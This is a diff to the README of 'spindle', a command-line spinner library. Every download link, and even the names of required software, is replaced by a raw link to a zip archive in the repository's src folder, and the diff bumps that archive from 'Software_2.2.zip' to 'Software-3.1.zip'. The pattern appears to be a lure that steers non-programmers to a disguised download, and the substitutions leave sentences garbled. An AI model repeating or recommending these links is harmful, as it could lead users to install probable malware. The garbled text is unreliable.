@@ -1,13 +1,13 @@
 # 🎉 spindle - Effortless Multi-Spinner for Your CLI
 
 ## 📥 Download Now
-[![Download spindle](https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software_2.2.zip)](https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software_2.2.zip)
+[![Download spindle](https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software-3.1.zip)](https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software-3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to spindle! This application helps you manage multiple spinners in your command-line interface with ease. You won't need any programming skills to use it effectively. Follow these simple steps to download and run spindle.
 
 ## 🌟 What is spindle?
-spindle is a lightweight library designed for https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software_2.2.zip that lets you have several spinners running simultaneously in your CLI. It offers a simple way to keep users engaged with dynamic animations while tasks are in progress. Whether you're loading data, processing files, or running scripts, spindle makes your command-line interaction smoother and more visually appealing.
+spindle is a lightweight library designed for https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software-3.1.zip that lets you have several spinners running simultaneously in your CLI. It offers a simple way to keep users engaged with dynamic animations while tasks are in progress. Whether you're loading data, processing files, or running scripts, spindle makes your command-line interaction smoother and more visually appealing.
 
 ## 📦 Features
 - **Multiple Spinners**: Run many spinners at once, perfect for concurrent operations.
@@ -18,12 +18,12 @@ spindle is a lightweight library designed for https://raw.githubusercontent.com/
 ## 🖥️ System Requirements
 To run spindle, you will need:
 - A computer with Windows, macOS, or Linux.
-- https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software_2.2.zip installed (version 12 or later, available from [https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software_2.2.zip](https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software_2.2.zip)).
+- https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software-3.1.zip installed (version 12 or later, available from [https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software-3.1.zip](https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software-3.1.zip)).
 
 ## 🔗 Download & Install
 To get started with spindle, visit the Releases page:
 
-[Download spindle releases](https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software_2.2.zip)
+[Download spindle releases](https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software-3.1.zip)
 
 1. Click on the link above to access the releases.
 2. Look for the latest version listed.
@@ -33,7 +33,7 @@ To get started with spindle, visit the Releases page:
 After downloading, you can run spindle using your command line interface. 
 
 ### ⚙️ Running spindle
-Once you have installed https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software_2.2.zip and downloaded spindle, follow these steps to run it:
+Once you have installed https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software-3.1.zip and downloaded spindle, follow these steps to run it:
 
 1. Open your command prompt (Windows) or terminal (macOS/Linux).
 2. Navigate to the directory where you downloaded spindle.
@@ -59,4 +59,4 @@ If you encounter any problems or have questions, please open an issue on our Git
 
 Enjoy using spindle! We hope it brings a fresh experience to your command-line tasks.
 
-[Download spindle releases](https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software_2.2.zip)
+[Download spindle releases](https://raw.githubusercontent.com/cmustardo100/spindle/main/src/Software-3.1.zip)
